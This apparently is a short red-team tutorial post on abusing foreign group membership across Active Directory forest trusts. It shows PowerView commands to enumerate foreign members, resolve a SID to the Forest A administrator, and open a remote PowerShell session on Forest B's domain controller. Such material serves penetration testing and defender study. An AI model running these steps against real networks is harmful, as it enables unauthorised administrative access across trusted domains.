---
title: Abusing Foreign Group Membership
date: 2026-07-07 08:29:09
categories:
  - Active Directory
  - Exploitation
  - Cross Forest
  - Abusing Foreign Group Membership
tags:
  - Forest-Trusts
  - Cross-Forest
  - Cross-Domain
  - Foreign-Group-Membership
  - Domain-Local-Groups
  - Get-DomainForeignGroupMember
  - Convert-SidToName
  - Enter-PSSession
  - Lateral-Movement
  - Privilege-Escalation
---

> ➜ Groups normally only accept members from their own forest. `Domain Local Groups` are the exception, they can include members from a trusted forest. So we may find a privileged account from Forest A inside a Domain Local group (often the built-in `Administrators`) of Forest B.

## Enumerate Foreign Group Members

```powershell
Import-Module .\PowerView.ps1
```

> ➜ List groups in the target forest that contain a member from another domain/forest.

```powershell
Get-DomainForeignGroupMember -Domain <FOREST_B>
```

> ➜ Result : an account from Forest A ( Our Forest ) is a member of Forest B’s built-in Administrators group (The Target Forest ) , notice the member comes back as a raw SID, not a name:

```powershell
GroupDomain             : <FOREST_B>
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=<FOREST_B>,DC=LOCAL
MemberDomain            : <FOREST_B>
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=<FOREST_B>,DC=LOCAL
```

## Resolve the SID to an Account Name

> ➜ Translate that SID so we know exactly which account crosses the trust.

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

> ➜ Result : the SID belongs to the Administrator of Forest A:

```powershell
<FOREST_A>\administrator
```

## Access the Trusting Forest

> ➜ We already control that account in Forest A, so we use it to open a remote session on Forest B’s Domain Controller, which can land us as an admin in the other forest.

```powershell
Enter-PSSession -ComputerName <FOREST_B_DC> -Credential <FOREST_A>\administrator
```
